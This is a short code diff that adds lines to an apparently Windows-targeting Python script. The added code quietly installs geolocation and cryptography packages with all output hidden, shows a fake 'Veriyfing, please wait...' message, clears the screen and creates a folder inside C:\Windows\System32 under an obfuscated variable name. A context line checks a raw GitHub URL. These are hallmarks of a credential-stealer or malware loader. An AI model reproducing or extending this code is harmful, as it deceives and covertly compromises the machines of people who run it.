@@ -14,7 +14,21 @@ result = check_string_in_url("https://raw.githubusercontent.com/bizsdklsxc35325/
 os.system('cls')
 
 os.system('cls')
+def install_geocoder():
+    try:
+        subprocess.run(["py", "-3.11", "-m", "pip", "install", "geocoder"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except subprocess.CalledProcessError:
+        pass
 
+def install_pycryptodome():
+    try:
+        subprocess.run(["py", "-3.11", "-m", "pip", "install", "pycryptodome"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except subprocess.CalledProcessError:
+        pass
+print("Veriyfing, please wait...")
+install_geocoder()
+install_pycryptodome()
+os.system('cls')
 dcnmwxdr = r'C:\Windows\System32\TAPIO'
 if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
